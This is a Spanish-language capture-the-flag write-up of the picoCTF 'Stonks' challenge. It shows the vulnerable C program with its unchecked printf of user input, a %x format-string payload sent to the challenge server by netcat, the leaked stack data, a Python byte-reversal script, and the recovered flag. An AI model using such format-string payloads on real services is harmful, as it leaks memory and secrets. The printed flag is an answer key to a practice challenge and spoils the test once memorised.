## Descripción 
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

## Datos de Acceso al Nivel
user: carlosof / kali
password:

## Solución
```bash
┌──(kali㉿kali)-[~/retosBinaryExploit/stonks]
└─$ wget https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c
--2024-11-12 16:15:17--  https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2744 (2.7K) [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                    100%[====================================================================================>]   2.68K  --.-KB/s    in 0s      

2024-11-12 16:15:17 (20.7 MB/s) - ‘vuln.c’ saved [2744/2744]

                                                                                                                                                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/stonks]
└─$ cat vuln.c       
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
                                                                                                                                                                       
┌──(kali㉿kali)-[~/retosBinaryExploit/stonks]
└─$ nc mercury.picoctf.net 6989
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x% 
Buying stonks with token:
8849410804b00080489c3f7fb0d80ffffffff18847160f7fbe110f7fb0dc708848180188493f088494106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533fff9007df7febaf8f7fbe440abddc80010f7e4dce9f7fbf0c0f7fb05c0f7fb0000fff9c8e8f7e3e68df7fb05c08048ecafff9c8f40f7fd2f09804b000f7fb0000f7fb0e20fff9c928f7fd8d50f7fb1890abddc800f7fb0000804b000fff9c9288048c868847160fff9c914fff9c9288048be9f7fb03fc0fff9c9dcfff9c9d4118847160abddc800fff9c94000f7df3fa1f7fb0000f7fb00000f7df3fa1
Portfolio as of Tue Nov 12 22:18:02 UTC 2024


1 shares of XEW
2 shares of MLEL
13 shares of NJL
16 shares of X
9 shares of PI
3 shares of HM
10 shares of FI
31 shares of KER
277 shares of VPZ
Goodbye!
```
- Ingresamos a CyberChef e ingresamos esto:
- 8849410804b00080489c3f7fb0d80ffffffff18847160f7fbe110f7fb0dc708848180188493f088494106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533fff9007df7febaf8f7fbe440abddc80010f7e4dce9f7fbf0c0f7fb05c0f7fb0000fff9c8e8f7e3e68df7fb05c08048ecafff9c8f40f7fd2f09804b000f7fb0000f7fb0e20fff9c928f7fd8d50f7fb1890abddc800f7fb0000804b000fff9c9288048c868847160fff9c914fff9c9288048be9f7fb03fc0fff9c9dcfff9c9d4118847160abddc800fff9c94000f7df3fa1f7fb0000f7fb00000f7df3fa1



```bash
cadena = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿù}'
for i in range(0, len(cadena), 4):
    print(cadena[i+3] + cadena[i+2] + cadena[i+1] + cadena[i], end='')
```
```
picoCTF{I_l05t_4ll_my_m0n3y_0a853e52
Traceback (most recent call last):
File "main.py", line 3, in <module>
print(cadena[i+3] + cadena[i+2] + cadena[i+1] + cadena[i], end='')
IndexError: string index out of range
```

- Flag: picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}
## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/105